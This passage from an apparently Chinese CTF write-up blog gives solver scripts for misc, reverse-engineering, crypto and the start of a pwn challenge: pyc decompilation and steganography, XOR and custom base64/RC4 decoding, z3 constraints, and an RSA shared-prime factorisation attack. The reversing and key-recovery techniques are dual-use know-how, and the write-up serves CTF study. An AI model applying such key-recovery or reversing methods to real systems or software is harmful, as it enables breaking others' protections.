alt="1747118509045-0d820e5c-e6fb-44e9-87dd-d05bfd2fc76c.png"></p><p><img src="/./img/g_5G5hK2cxX3dqC2/1747118541230-893ce483-5359-4c5f-853d-15b38ecec8bb-277428.png" alt="1747118541230-893ce483-5359-4c5f-853d-15b38ecec8bb.png"></p><p>补齐数据然后看看十六进制转字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">5000000721500000072150000007216000000DA083C6D6F64756C653E01000000F30A0000000C010802080C080A0801<br></code></pre></td></tr></table></figure><p>330D0D0A8BD11868BB020000E300000000000000000000000002000000400000007336000000640064016C006D015A010100640064026C025A026403640484005A036405640684005A04650564076B027232650483000100640253002908E900000000A901DA034145534E63020000000000000005000000030000004300000073480000007C00640117317D027C026A00640283017D027C026A016403640483027D0274026A037C0274026A0483027D0374056A067C0183017D017C036A077C0183016A0883007D047C04534029054EDA0A71657478736F636F6F6CFA057574662D38E918000000F301000000412909DA06656E636F6465DA05726A7573747203000000DA036E6577DA084D4F44455F454342DA0862696E6173636969DA09756E6865786C696679DA0764656372797074DA066465636F64652905DA0178DA06636970686572DA036B6579DA03616573DA04666C6167A9007215000000FA1A2F686F6D652F6B616C692F4465736B746F702F666C61672E7079720E00000004000000F30E000000000108010A010C010E010A010E01720E000000630000000000000000030000000300000043000000733C00000064017D007400640283017D0174017C017C0083027D0274027C028301016864037C026B06723074026404830101756E0874026405830101546400537929064EDA60626536666236626162663739326362626633343838336139333536626637333735376339326138333465666162346264633139366634343736633637313563343965666430626331306234363364393463353032303435646533353063323637FA17506C6561736520696E70757420796F7572206B65793A207214000000FA13576F772C20796F752066696E64206974212121FA084F68206E6F2121212903DA05696E707574720E000000DA057072696E742903DA0163DA016B7214000000721500000072150000007216000000DA046D61696E10000000F30E0000000001040108010A01080108010A027220000000DA085F5F6D61696E5F5F2906DA0D43727970746F2E4369706865727203000000720C000000720E0000007220000000DA085F5F6E616D655F5F7215000000721500000072150000007216000000DA083C6D6F64756C653E01000000F30A0000000C010802080C080A0801</p><p>ai分析这是一个pyc文件，</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1747119456480-e7696314-924c-414a-a29a-6e160aefaa91-728868.png" alt="1747119456480-e7696314-924c-414a-a29a-6e160aefaa91.png"></p><p>直接uncompyle6</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1747119824508-cd8c8c5d-d2ba-4f04-be98-cdffd1caca32-321389.png" alt="1747119824508-cd8c8c5d-d2ba-4f04-be98-cdffd1caca32.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plain">from Crypto.Cipher import AES<br>import binascii<br><br>def decrypt(x, cipher):<br>    key = x + &quot;qetxsocool&quot;<br>    key = key.encode(&quot;utf-8&quot;)<br>    key = key.rjust(24, b&#x27;A&#x27;)<br>    aes = AES.new(key, AES.MODE_ECB)<br>    cipher = binascii.unhexlify(cipher)<br>    flag = aes.decrypt(cipher).decode()<br>    return flag<br><br><br>def main():<br>    c = &quot;be6fb6babf792cbbf34883a9356bf73757c92a834efab4bdc196f4476c6715c49efd0bc10b463d94c502045de350c267&quot;<br>    k = input(&quot;Please input your key: &quot;)<br>    flag = decrypt(k, c)<br>    print(flag)<br>    if &quot;flag&quot; in flag:<br>        print(&quot;Wow, you find it!!!&quot;)<br>    else:<br>        print(&quot;Oh no!!!&quot;)<br><br><br>if __name__ == &quot;__main__&quot;:<br>    main()<br><br></code></pre></td></tr></table></figure><p>这是我们之前拿到的key还记得吗，不需要爆破</p><p>这里还傻傻的写了一个爆破脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>from Crypto.Cipher import AES<br>import binascii<br>import string<br>from itertools import product<br><br>def decrypt(x, cipher_hex):<br>    key = (x + &quot;qetxsocool&quot;).encode(&quot;utf-8&quot;)<br>    key = key.rjust(24, b&#x27;A&#x27;)  # AES-192 key<br>    aes = AES.new(key, AES.MODE_ECB)<br>    cipher = binascii.unhexlify(cipher_hex)<br>    try:<br>        result = aes.decrypt(cipher).decode(&quot;utf-8&quot;)<br>        if &quot;flag&quot; in result:<br>            print(f&quot;[+] Found! x = &#x27;&#123;x&#125;&#x27;&quot;)<br>            print(f&quot;[+] Decrypted = &#123;result&#125;&quot;)<br>            return True<br>    except:<br>        pass<br>    return False<br><br>def brute_force(cipher_hex):<br>    charset = string.ascii_lowercase + string.digits  # 可选添加更多字符<br>    for length in range(1, 6):  # 控制爆破长度<br>        for x_tuple in product(charset, repeat=length):<br>            x = &#x27;&#x27;.join(x_tuple)<br>            if decrypt(x, cipher_hex):<br>                return  # 找到就退出<br><br>if __name__ == &quot;__main__&quot;:<br>    c = &quot;be6fb6babf792cbbf34883a9356bf73757c92a834efab4bdc196f4476c6715c49efd0bc10b463d94c502045de350c267&quot;<br>    brute_force(c)<br><br></code></pre></td></tr></table></figure><p>输入这个试试baaaaaaaacaaaaacaab</p><p>不对这个加上qetxsocool超过了24字符(这条路走不通)</p><h3 id="pyc隐写（hint）"><a href="#pyc隐写（hint）" class="headerlink" title="pyc隐写（hint）"></a>pyc隐写（hint）</h3><p><a href="https://github.com/AngelKitty/stegosaurus">https://github.com/AngelKitty/stegosaurus</a></p><p><img src="/./img/g_5G5hK2cxX3dqC2/1747123365152-909bc104-cbf9-4a89-afc7-31e4b47e64c5-220183.png" alt="1747123365152-909bc104-cbf9-4a89-afc7-31e4b47e64c5.png"></p><p>得到key：huTy1@</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1747123404576-eb565172-cd61-4135-a9d9-5bdd3e100b29-616286.png" alt="1747123404576-eb565172-cd61-4135-a9d9-5bdd3e100b29.png"></p><p>flag{qetx’s_JETT_1S_S0oo0oo_Wanderfu1!!!}</p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="ipa（校赛）"><a href="#ipa（校赛）" class="headerlink" title="ipa（校赛）"></a>ipa（校赛）</h2><p>后缀改成zip然后解压</p><p>将exec文件拖入ida反编译</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1747206676676-b1a270f2-a557-4686-a42f-2db66f880c12-635681.png" alt="1747206676676-b1a270f2-a557-4686-a42f-2db66f880c12.png"></p><p>加载的时候没看到最上面的函数（所以说不能只盯着main函数看）</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1747206965205-337d5f3e-4a3e-4c64-ad0e-520ead96d7e1-095013.png" alt="1747206965205-337d5f3e-4a3e-4c64-ad0e-520ead96d7e1.png"></p><p>数据在src里面</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1747207108017-1a3f6a32-9be5-438c-a7e2-8db30fa5da67-753345.png" alt="1747207108017-1a3f6a32-9be5-438c-a7e2-8db30fa5da67.png"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">a=&#x27;Ios&#x27;<br>miwen=[0x2F,0x3,0x12,0x2E,0x14,0x21,0x2C,0x19,0x16,0x3B,0x1C,0x16,0x16,0x9,0x43,0x3B,0x30,0x3A,0x79,0x1C,0x2C,0x78,0x1C,0x2C,0x0,0x1,0x7,0x2C,0x1D,0x16,0x3A,0x3B,0x1A,0x27,0x8,0xE]<br><span class="hljs-section">#print(len(miwen))</span><br>for i in range(len(miwen)):<br><span class="hljs-code">    b=miwen[i]^ord(a[i%3])</span><br><span class="hljs-code">    print(chr(b),end=&#x27;&#x27;)</span><br></code></pre></td></tr></table></figure><p><img src="/./img/g_5G5hK2cxX3dqC2/1747207305281-7bb2bab9-cc9b-4ca4-900b-35138d365388-311448.png" alt="1747207305281-7bb2bab9-cc9b-4ca4-900b-35138d365388.png"></p><h2 id="babyz3"><a href="#babyz3" class="headerlink" title="babyz3"></a>babyz3</h2><p><img src="/./img/g_5G5hK2cxX3dqC2/1747036587351-5ade56f1-b762-4ac8-abee-6d5cb7b60f51-951588.png" alt="1747036587351-5ade56f1-b762-4ac8-abee-6d5cb7b60f51.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plain">int __fastcall main(int argc, const char **argv, const char **envp)<br>&#123;<br>  unsigned int seed; // eax<br>  char s[96]; // [rsp+10h] [rbp-70h] BYREF<br>  int v6; // [rsp+70h] [rbp-10h]<br>  int i_1; // [rsp+78h] [rbp-8h]<br>  int i; // [rsp+7Ch] [rbp-4h]<br><br>  memset(s, 0, sizeof(s));<br>  v6 = 0;<br>  printf(&quot;input:&quot;);<br>  __isoc99_scanf(&quot;%s&quot;, s);<br>  if ( strlen(s) == 20 )<br>  &#123;<br>    seed = time(0LL);<br>    srand(seed);<br>    i_1 = rand() % 100;<br>    for ( i = 0; i &lt; i_1; ++i )<br>      ;<br>    if ( *(unsigned __int16 *)s * *(unsigned __int16 *)&amp;s[2] == 342772773<br>      &amp;&amp; *(unsigned __int16 *)s + *(unsigned __int16 *)&amp;s[2] == 39526<br>      &amp;&amp; *(_DWORD *)&amp;s[4] - *(_DWORD *)&amp;s[8] == 1005712381<br>      &amp;&amp; *(unsigned __int16 *)&amp;s[4] + *(unsigned __int16 *)&amp;s[6] == 56269<br>      &amp;&amp; *(unsigned __int16 *)&amp;s[8] - *(unsigned __int16 *)&amp;s[10] == 15092<br>      &amp;&amp; s[4] * s[8] == 10710<br>      &amp;&amp; s[6] * s[10] == 12051<br>      &amp;&amp; s[7] + s[11] == 172<br>      &amp;&amp; *(unsigned __int16 *)&amp;s[12] * *(unsigned __int16 *)&amp;s[14] == 171593250<br>      &amp;&amp; *(unsigned __int16 *)&amp;s[12] + *(unsigned __int16 *)&amp;s[14] == 26219<br>      &amp;&amp; *(unsigned __int16 *)&amp;s[16] * *(unsigned __int16 *)&amp;s[18] == 376306868<br>      &amp;&amp; *(unsigned __int16 *)&amp;s[16] + *(unsigned __int16 *)&amp;s[18] == 40341 )<br>    &#123;<br>      puts(&quot;check ok~!&quot;);<br>    &#125;<br>    else<br>    &#123;<br>      puts(&quot;check failed~!&quot;);<br>    &#125;<br>  &#125;<br>  return 1;<br>&#125;<br></code></pre></td></tr></table></figure><p>刚开始还被这个seed迷惑，后来ai分析是混淆代码的</p><p>所以直接逆下面的z3就行</p><p>主要是中间这块难求，剩下的就是x*y，x+y的简单计算，可手搓也可脚本</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1746950053674-d2ade2f6-39d6-4f68-a77b-96fb2230efe5-262167.png" alt="1746950053674-d2ade2f6-39d6-4f68-a77b-96fb2230efe5.png">得到端序后调整下即可</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1746950119674-dea1c885-86a1-4135-bb5d-e48dc8a379a7-160357.webp" alt="1746950119674-dea1c885-86a1-4135-bb5d-e48dc8a379a7.png"></p><p><img src="/./img/g_5G5hK2cxX3dqC2/1746950154580-92cc363e-f357-4f06-bfbe-760120ff3d60-700561.webp" alt="1746950154580-92cc363e-f357-4f06-bfbe-760120ff3d60.png"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">最后flag&#123;5h12fggtisu8952149ad&#125;<br></code></pre></td></tr></table></figure><h2 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h2><p>把标识符改成UPX 脱壳即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=[0x6D,0x68,0x64,0x69,0x70,0x51,0x75,0x76,0x54,0x35,0x76,0x51,0x65,0x34,0x71,0x51,0x6F,0x35,0x63,0x68,0x62,0x67,0x70,0x62,0x7F,0x79,0x0,0x0,0xB,0x4,0x5,0xE]<br>for i in range(len(a)):<br>    b=a[i]^a[i%4+28]<br>    print(chr(b),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h2 id="安卓"><a href="#安卓" class="headerlink" title="安卓"></a>安卓</h2><p><img src="/./img/g_5G5hK2cxX3dqC2/1746925862924-ddcf17d4-2524-48a9-a1be-4d6e0d2f93b6-969079.webp" alt="1746925862924-ddcf17d4-2524-48a9-a1be-4d6e0d2f93b6.png"></p><p>一个base64，一个rc4，uname为key</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1746928114612-f8174e41-3e47-4f25-84a4-8b801ab5adb3-287600.webp" alt="1746928114612-f8174e41-3e47-4f25-84a4-8b801ab5adb3.png"></p><p>base64加密中的第二个和第三个字符的处理被调换了顺序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs plain">def decode_custom_base64(s):<br>    # 魔改Base64字符表<br>    BASE64_TABLE = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;<br>    table = &#123;char: idx for idx, char in enumerate(BASE64_TABLE)&#125;<br><br>    bytes_list = []<br>    s = s.rstrip(&#x27;=&#x27;)  # 去除末尾等号避免干扰<br><br>    # 每次处理4个字符<br>    for i in range(0, len(s), 4):<br>        chunk = s[i:i + 4].ljust(4, &#x27;=&#x27;)  # 补足4字符<br>        c1, c2, c3, c4 = chunk<br><br>        # 字符转6位值（等号视为0）<br>        v1 = table.get(c1, 0)<br>        v2 = table.get(c2, 0)<br>        v3 = table.get(c3, 0)<br>        v4 = table.get(c4, 0)<br><br>        # 逆向魔改编码规则计算原始字节<br>        byte1 = (v1 &lt;&lt; 2) | ((v3 &gt;&gt; 4) &amp; 0x03)<br>        byte2 = ((v3 &amp; 0x0F) &lt;&lt; 4) | ((v2 &gt;&gt; 2) &amp; 0x0F)<br>        byte3 = ((v2 &amp; 0x03) &lt;&lt; 6) | v4<br><br>        # 根据等号位置判断有效字节<br>        if c2 == &#x27;=&#x27;:  # 仅1字节有效<br>            bytes_list.append(byte1)<br>        elif c4 == &#x27;=&#x27;:  # 2字节有效<br>            bytes_list.append(byte1)<br>            bytes_list.append(byte2)<br>        else:  # 3字节有效<br>            bytes_list.append(byte1)<br>            bytes_list.append(byte2)<br>            bytes_list.append(byte3)<br><br>    return bytes(bytes_list)<br><br><br># 示例验证<br>encoded_str = &quot;aFj5YITya42wdRzuZIHwM5Wk&quot;<br>decoded_bytes = decode_custom_base64(encoded_str)<br>print(f&quot;Decoded: &#123;decoded_bytes&#125;&quot;)  # 输出 a3<br># j1ya22kn0w4ndr01nd<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plain">def decrypt(data: bytes, key: bytes) -&gt; bytes:<br>    # 初始化S盒<br>    S = list(range(256))<br>    j = 0<br>    key_len = len(key)<br><br>    # KSA密钥调度算法（与Java实现完全一致）<br>    for i in range(256):<br>        j = (S[i] + j + key[i % key_len]) % 256<br>        S[i], S[j] = S[j], S[i]<br><br>    # PRGA伪随机生成算法<br>    i = j = 0<br>    keystream = []<br>    for _ in range(len(data)):<br>        i = (i + 1) % 256<br>        j = (S[i] + j) % 256  # 注意此处与标准RC4不同的加法顺序<br>        S[i], S[j] = S[j], S[i]<br>        keystream.append(S[(S[i] + S[j]) % 256])<br><br>    # 逆向魔改加密逻辑：加密是加法，解密则用减法<br>    decrypted = bytearray()<br>    for d, k in zip(data, keystream):<br>        decrypted.append((d - k) % 256)  # 处理负数自动取模<br><br>    return bytes(decrypted)<br><br><br># 测试用例（使用Java代码中的示例数据）<br>if __name__ == &quot;__main__&quot;:<br>    encrypted_data = bytes([<br>        14, 50, 174, 75, 131, 55, 144, 85,<br>        99, 200, 97, 174, 69, 61, 254, 143,<br>        157, 48<br>    ])<br>    key = b&quot;j1ya22kn0w4ndr01nd&quot;<br><br>    result = decrypt(encrypted_data, key)<br>    print(&quot;Decrypted hex:&quot;, result.hex())<br>    print(&quot;Decrypted text:&quot;, result.decode(&#x27;latin-1&#x27;))<br>    # andro1nd14d1ffcult<br></code></pre></td></tr></table></figure><p>flag{j1ya22kn0w4ndr01nd_andro1nd14d1ffcult}</p><h2 id="harre-鸿蒙逆向了解"><a href="#harre-鸿蒙逆向了解" class="headerlink" title="harre-鸿蒙逆向了解"></a>harre-鸿蒙逆向了解</h2><p><font style="color:rgb(0, 0, 0);">主要还是熟悉这个hap怎么逆向的</font></p><p><font style="color:rgb(0, 0, 0);">进去后直接就看到一个base64变表加密</font></p><p><img src="/./img/g_5G5hK2cxX3dqC2/1747036391551-833e913b-1e3a-4554-afd8-edaadb09221e-952893.png" alt="1747036391551-833e913b-1e3a-4554-afd8-edaadb09221e.png"></p><p><img src="/./img/g_5G5hK2cxX3dqC2/1747036402437-f6099d0d-c0b1-4744-9b67-e4a8c0bc4891-649008.png" alt="1747036402437-f6099d0d-c0b1-4744-9b67-e4a8c0bc4891.png"></p><p><img src="/./img/g_5G5hK2cxX3dqC2/1747036261199-f5e1e789-eb78-4835-be0f-3a1b09eae051-934297.png" alt="1747036261199-f5e1e789-eb78-4835-be0f-3a1b09eae051.png"></p><h2 id="re的本质"><a href="#re的本质" class="headerlink" title="re的本质"></a>re的本质</h2><p>？？？ 不是gm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=&#x27;&#125;detacitsihpos_3b_ot_tub_llik_dn@_thg1f_ot_ton_s1_esrever_f0_ecn3sse_ehT&#123;galf&#x27;<br>print(a[::-1])<br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="你们密码手都会RSA嘛"><a href="#你们密码手都会RSA嘛" class="headerlink" title="你们密码手都会RSA嘛"></a><strong>你们密码手都会RSA嘛</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs plain">from Crypto.Util.number import long_to_bytes, inverse, GCD<br>from pathlib import Path<br><br>def read_public_keys(filename):<br>    with open(filename, &quot;r&quot;) as f:<br>        keys = []<br>        for line in f:<br>            N_str, e_str = line.strip().split(&quot;,&quot;)<br>            keys.append((int(N_str), int(e_str)))<br>        return keys<br><br>def read_ciphertexts(filename):<br>    ciphertexts = []<br>    data = Path(filename).read_bytes()<br><br>    # 密文长度不固定，需要根据 key size 猜长度<br>    # 约为 1024 bits = 128 bytes<br>    i = 0<br>    while i &lt; len(data):<br>        for length in range(128, 150):  # 尝试不同长度<br>            chunk = data[i:i+length]<br>            ct = int.from_bytes(chunk, &#x27;big&#x27;)<br>            if ct.bit_length() &gt; 500:  # 粗略过滤无效块<br>                ciphertexts.append(ct)<br>                i += length<br>                break<br>        else:<br>            break<br>    return ciphertexts<br><br>def main():<br>    pub_keys = read_public_keys(&quot;public_keys.txt&quot;)<br>    ciphertexts = read_ciphertexts(&quot;ciphertexts.bin&quot;)<br><br>    # Step 1: 找出共享素因子的两组 key<br>    for i in range(len(pub_keys)):<br>        for j in range(i + 1, len(pub_keys)):<br>            N1, _ = pub_keys[i]<br>            N2, _ = pub_keys[j]<br>            p = GCD(N1, N2)<br>            if 1 &lt; p &lt; min(N1, N2):<br>                print(f&quot;Found shared prime p = &#123;p&#125;&quot;)<br>                shared_pair = (i, j)<br>                break<br>        else:<br>            continue<br>        break<br><br>    # Step 2: 获取对应数据<br>    i, j = shared_pair<br>    N1, e = pub_keys[i]<br>    N2, _ = pub_keys[j]<br>    c1 = ciphertexts[i]<br>    c2 = ciphertexts[j]<br><br>    # Step 3: 分解 N1, N2<br>    p = GCD(N1, N2)<br>    q1 = N1 // p<br>    q2 = N2 // p<br>    phi1 = (p - 1) * (q1 - 1)<br>    d1 = inverse(e, phi1)<br><br>    # Step 4: 解密<br>    m = pow(c1, d1, N1)<br>    flag = long_to_bytes(m)<br><br>    print(f&quot;[+] Recovered flag: &#123;flag.decode(errors=&#x27;ignore&#x27;)&#125;&quot;)<br><br>if __name__ == &quot;__main__&quot;:<br>    main()<br><br></code></pre></td></tr></table></figure><h2 id="密码是什么可以吃吗"><a href="#密码是什么可以吃吗" class="headerlink" title="密码是什么可以吃吗"></a>密码是什么可以吃吗</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plain">import base64<br><br>symbols = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;<br>codes = [format(i, &#x27;05b&#x27;).replace(&#x27;0&#x27;, &#x27;a&#x27;).replace(&#x27;1&#x27;, &#x27;b&#x27;) for i in range(32)]<br>dec_map = &#123;code: sym for sym, code in zip(symbols, codes)&#125;  # 创建解码映射<br><br><br>def fix_base32_padding(s):<br>    return s + &quot;=&quot; * ((8 - len(s) % 8) % 8)<br><br><br>def decrypt(ab_text):<br>    # 将密文分割为5字符一组<br>    chunks = [ab_text[i:i + 5] for i in range(0, len(ab_text), 5)]<br><br>    # 转换为Base32字符<br>    try:<br>        b32_str = &#x27;&#x27;.join([dec_map[chunk] for chunk in chunks])<br>    except KeyError:<br>        return &quot;包含无效的ab序列&quot;<br><br>    # 补全padding并解码<br>    b32_str = fix_base32_padding(b32_str)<br>    try:<br>        return base64.b32decode(b32_str).decode(&#x27;utf-8&#x27;)<br>    except:<br>        return &quot;解码失败（请检查padding）&quot;<br><br><br># 要解密的密文<br>cipher = &quot;abbaabbaabbabbaaabbaaaababbaabbbabbbbabbbbbabaabbaaaaabbbabbbbabbbbaabaababbbaaabaaabbabbbbaabbbbaabbaabbabbbbabbbbaabbabaabbbabbabaababababbbbbbbbaabaababbbaaabaaabbabbbbabaabbaaaaabbbabbbbabbbbaabbabaabbbabbabaababbbbaabbbbaabbaabbabbbbababbbbbabaa&quot;<br><br>print(decrypt(cipher))<br></code></pre></td></tr></table></figure><p><img src="/./img/g_5G5hK2cxX3dqC2/1747016449411-060cae3b-59a0-4188-9a14-876497a0bca1-117008.png" alt="1747016449411-060cae3b-59a0-4188-9a14-876497a0bca1.png"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="mathgame"><a href="#mathgame" class="headerlink" title="mathgame"></a>mathgame</h2><h3 id="补上暑假内部赛wp复现"><a href="#补上暑假内部赛wp复现" class="headerlink" title="补上暑假内部赛wp复现"></a>补上暑假内部赛wp复现</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 